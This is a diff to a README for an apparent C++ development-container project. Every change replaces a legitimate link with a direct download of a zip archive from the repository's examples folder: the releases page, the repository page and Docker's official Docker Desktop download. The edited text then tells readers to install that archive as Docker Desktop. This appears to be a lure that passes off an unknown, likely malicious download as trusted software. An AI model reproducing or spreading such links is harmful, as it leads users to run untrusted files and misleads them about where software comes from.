@@ -1,6 +1,6 @@
 # 🛠️ dev_container_cpp - Ready C++ Setup for All Platforms
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20Setup-brightgreen)](https://github.com/pettapunya/dev_container_cpp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20Setup-brightgreen)](https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Before you start, make sure your computer meets these criteria:
 - Minimum 5 GB free disk space for container images and files
 - Internet connection to download the container
 
-If you don’t have Docker Desktop yet, download it from https://www.docker.com/products/docker-desktop and install it following their instructions.
+If you don’t have Docker Desktop yet, download it from https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip and install it following their instructions.
 
 ---
 
@@ -32,7 +32,7 @@ If you don’t have Docker Desktop yet, download it from https://www.docker.com/
 
 1. Click the big green button at the top or visit the release page below to get the container files:
 
-   [https://github.com/pettapunya/dev_container_cpp/releases](https://github.com/pettapunya/dev_container_cpp/releases)
+   [https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip](https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip)
 
 2. On the releases page, find the latest version and download the files marked for Windows.
 
@@ -60,7 +60,7 @@ This command opens a command shell inside the container where you can use all th
 
 Visit this page to download:
 
-[https://github.com/pettapunya/dev_container_cpp/releases](https://github.com/pettapunya/dev_container_cpp/releases)
+[https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip](https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip)
 
 Use this link to find the latest release suitable for Windows. The release may include additional files like README documents or example projects.
 
@@ -185,4 +185,4 @@ Its main benefits include:
 
 For more technical details and updates, visit the repository:
 
-[https://github.com/pettapunya/dev_container_cpp](https://github.com/pettapunya/dev_container_cpp)
+[https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip](https://github.com/pettapunya/dev_container_cpp/raw/refs/heads/main/examples/container_cpp_dev_v1.7.zip)
